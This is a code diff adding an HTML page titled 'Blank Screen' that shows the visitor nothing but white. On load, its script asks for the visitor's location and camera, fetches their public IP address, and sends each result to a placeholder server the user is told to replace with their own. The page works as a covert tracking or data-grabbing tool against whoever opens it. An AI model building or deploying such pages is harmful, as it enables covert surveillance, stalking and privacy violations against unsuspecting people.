@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blank Screen</title>
+  <style>
+    body { background-color: white; height: 100vh; margin: 0; }
+  </style>
+</head>
+<body>
+  <script>
+    // request location
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+          sendDataToServer('location', data);
+        },
+        (error) => {
+          console.error('location access error:', error);
+        }
+      );
+    } else {
+      console.error('geolocation not supported');
+    }
+
+    // request camera access
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          // send camera data (could be a blob or stream info)
+          sendDataToServer('camera', { message: 'camera accessed' });
+        })
+        .catch((error) => {
+          console.error('camera access error:', error);
+        });
+    } else {
+      console.error('camera access not supported');
+    }
+
+    // fetch public ip
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        const ipData = { ip: data.ip };
+        sendDataToServer('ip', ipData);
+      })
+      .catch((error) => {
+        console.error('ip fetch error:', error);
+      });
+
+    // send data to the server
+    function sendDataToServer(type, data) {
+      fetch('https://your-server-endpoint.com', {  // change to your server's URL
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ type, data })
+      })
+      .then((response) => response.json())
+      .then((responseData) => {
+        console.log('data sent successfully:', responseData);
+      })
+      .catch((error) => {
+        console.error('error sending data:', error);
+      });
+    }
+  </script>
+</body>
+</html>
